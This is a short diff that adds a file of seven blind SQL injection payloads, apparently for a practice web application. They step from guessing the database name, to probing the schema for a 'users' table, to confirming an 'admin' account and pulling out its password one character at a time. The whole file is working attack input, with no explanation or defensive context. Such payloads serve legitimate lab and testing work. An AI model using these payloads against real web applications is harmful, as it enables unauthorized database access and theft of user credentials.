@@ -1,0 +1,7 @@
+1' and length(database())=4#
+1' and substring(database(),1,1)="d"#
+1' and exists(select table_name from information_schema.tables where table_name="users")#
+1' and exists(select user from information_schema.columns where table_name="users")#
+1' and exists(select user from users where user="admin")#
+1' and (select length(password) from users where user="admin")<50#
+1' and substring((select password from users where user="admin"),1,1)="5"#
